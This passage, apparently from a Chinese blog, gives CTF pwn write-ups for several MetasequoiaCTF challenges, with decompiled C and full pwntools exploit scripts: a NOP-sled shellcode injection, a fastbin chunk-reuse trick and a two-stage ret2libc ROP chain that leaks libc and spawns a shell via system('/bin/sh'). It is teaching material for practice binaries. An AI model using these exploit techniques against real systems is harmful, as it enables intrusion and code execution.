class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./snow_mountain'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line">shellcode = <span class="string">'\xeb\x18\x5e\x48\x8d\x7e\x01\xc4\xe2\x7d\x78\x0e\xc5\xfe\x6f\x07\xc5\xfd\xef\xc1\xc5\xfe\x7f\x07\xeb\x06\xe8\xe3\xff\xff\xff\xaa\xe2\x9b\x6a\xfa\xe2\x23\x48\xe2\x14\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xfc\xe2\x23\x4d\xfa\xfd\xe2\x23\x4c\x1a\x91\xa5\xaf'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x00000000004009b3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Current position: '</span>)</span><br><span class="line">addr = eval(rc(<span class="number">14</span>))</span><br><span class="line">info_addr(<span class="string">'addr'</span>,addr)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&gt; '</span>)</span><br><span class="line">payload = <span class="string">'\x90'</span>*<span class="number">1337</span>*<span class="number">2</span></span><br><span class="line">payload += shellcode</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&gt; '</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(hex(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Summoner"><a href="#Summoner" class="headerlink" title="Summoner"></a>Summoner</h2><ul><li><p>题目描述：</p><blockquote><p>邪恶召唤师拦住了你的去路。这将是一场召唤师之间的对决。<br>By <em>Mercurio</em></p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Summoner/summoner" target="_blank" rel="noopener">summoner</a></p></li><li><p>考察点：fastbin回收机制</p></li><li><p>难度：简单</p></li><li><p>初始分值：250</p></li><li><p>最终分值：239</p></li><li><p>完成人数：3</p></li></ul><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>功能：创建小怪、释放小怪、升级小怪、显示等级、派小怪打BOSS。</p><p>限制：只可以创建一个小怪，最高升到4级，只有5级小怪可以打败BOSS，给flag</p><p>分析一下，不难看出小怪结构体如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">imagin</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"><span class="keyword">int</span>  level;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p><code>summon</code>功能如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"summon"</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s, <span class="string">"summon"</span>, <span class="number">6u</span>LL) )&#123;</span><br><span class="line">    <span class="keyword">if</span> ( imagin )&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Already have one creature. Release it first."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cmd = <span class="string">"\n"</span>;</span><br><span class="line">        nptr = strtok(&amp;v11, <span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( nptr )&#123;</span><br><span class="line">            imagin = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">            <span class="keyword">if</span> ( !imagin )&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"malloc() returned NULL. Out of Memory\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            *imagin = strdup(nptr);             <span class="comment">// call malloc</span></span><br><span class="line">            cmd = nptr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Current creature:\"%s\"\n"</span>, nptr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Invalid command"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>summon</code>的时候会先<code>malloc</code>一个<code>0x10</code>的chunk，随后的<code>strdup</code>也会调用<code>malloc</code>，chunk的大小取决于小怪名字的长度。</p><p><code>release</code>功能如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"release"</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s, <span class="string">"release"</span>, <span class="number">7u</span>LL) )&#123;</span><br><span class="line"><span class="keyword">if</span> ( imagin )&#123;</span><br><span class="line"><span class="built_in">free</span>(*imagin);</span><br><span class="line">imagin = <span class="number">0L</span>L;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Released."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"No creature summoned."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>release</code>的时候释放了<code>strdup</code>分配的内存。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目环境是<code>libc2.23</code>，没开<code>t-cache</code>机制，所以可以控制小怪的名字长度，分配一个<code>0x10</code>大小的chunk，然后释放掉它，这样就有了一个<code>0x10</code>的<code>fastbin</code>，再次<code>summon</code>小怪的时候，小怪结构体会被分配到<code>strdup</code>用过的chunk，chunk中的数据没有被清空，只要让<code>chunk+8=5</code>即可伪造等级</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./summoner'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line">sla(<span class="string">'&gt; '</span>,<span class="string">'summon aaaaaaaa\5'</span>) </span><br><span class="line">sla(<span class="string">'&gt; '</span>,<span class="string">'release'</span>)</span><br><span class="line">sla(<span class="string">'&gt; '</span>,<span class="string">'summon aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)</span><br><span class="line">sla(<span class="string">'&gt; '</span>,<span class="string">'strike'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><p>超级详细的<a href="https://github.com/SignorMercurio/MetasequoiaCTF/tree/master/Pwn/Summoner" target="_blank" rel="noopener">Summoner</a>解析</p><h2 id="demon-dragon"><a href="#demon-dragon" class="headerlink" title="demon_dragon"></a>demon_dragon</h2><ul><li><p>题目描述：</p><blockquote><p>在Demon Dragon的巢穴入口，你遇到了一位女巫。<br>女巫说： 金克木，木克土，土克水，水克火，火克金。<br>By <em>Mercurio</em>                            </p></blockquote></li><li><p>题目附件：</p><blockquote><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/DemonDragon/demon_dragon" target="_blank" rel="noopener">demon_dragon</a><br><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/DemonDragon/libmagic.so" target="_blank" rel="noopener">libmagic.so</a></p></blockquote></li><li><p>考察点：动态链接？栈溢出</p></li><li><p>难度：简单</p></li><li><p>初始分值：300</p></li><li><p>最终分值：299</p></li><li><p>完成人数：2</p></li></ul><h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><p>需要加载附件给的动态库，直接扔到<code>/lib</code>目录下即可在本地运行程序。</p><p>动态库里有乱七八糟一堆函数，都没有什么用，下面这个函数里有很明显的栈溢出，直接<code>ROP</code>带走即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400C41</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Suddenly, the Demon Dragon attacked you with %s, %s, %s, %s, %s!\n\n"</span>,</span><br><span class="line">    (<span class="keyword">char</span> *)v2 + <span class="number">6</span> * dword_6020B0,</span><br><span class="line">    (<span class="keyword">char</span> *)v2 + <span class="number">6</span> * dword_6020B4,</span><br><span class="line">    (<span class="keyword">char</span> *)v2 + <span class="number">6</span> * dword_6020B8,</span><br><span class="line">    (<span class="keyword">char</span> *)v2 + <span class="number">6</span> * dword_6020BC,</span><br><span class="line">    (<span class="keyword">char</span> *)v2 + <span class="number">6</span> * dword_6020C0);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What are you going to do?!!\nSkill &gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./demon_dragon'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x0000000000400e43</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">main = <span class="number">0x00400D6E</span></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">72</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += p64(prdi) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.sym[<span class="string">'puts'</span>]) + p64(main)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Skill &gt; '</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line">puts = uu64(rc(<span class="number">6</span>))</span><br><span class="line">info_addr(<span class="string">'puts'</span>,puts)</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info_addr(<span class="string">'base'</span>,libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop2</span></span><br><span class="line">ru(<span class="string">'Skill &gt; '</span>)</span><br><span class="line">payload2 = <span class="string">'B'</span>*offset</span><br><span class="line">payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)</span><br><span class="line">debug()</span><br><span class="line">sl(payload2)</span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Samsara"><a href="#Samsara" class="headerlink" title="Samsara"></a>Samsara</h2><ul><li><p>题目描述：</p><blockquote><p>在击败Demon Dragon后，你终于也变成了Demon Dragon……<br>By <em>Mercurio</em>     </p></blockquote></li><li><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Samsara/samsara" target="_blank" rel="noopener">题目附件</a></p></li><li><p>考察点：double free</p></li><li><p>难度：中等</p></li><li><p>初始分值：300</p></li><li><p>最终分值：299</p></li><li><p>完成人数：2</p></li></ul><h3 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h3><p>菜单题，输入1创建大小为8的chunk，输入2将其释放，输入3可修改任意chunk数据，输入4打印变量<code>v9</code>地址，输入5可修改<code>v9</code>的值，输入6时判断变量<code>v10</code>，当<code>v10==0xDEADBEEF</code>时给flag</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>&#123;</span><br><span class="line">  __int64 *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">__gid_t</span> rgid; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  v3 = (__int64 *)rgid;</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  v4 = <span class="string">"After defeating the Demon Dragon, you turned yourself into the Demon Dragon..."</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"After defeating the Demon Dragon, you 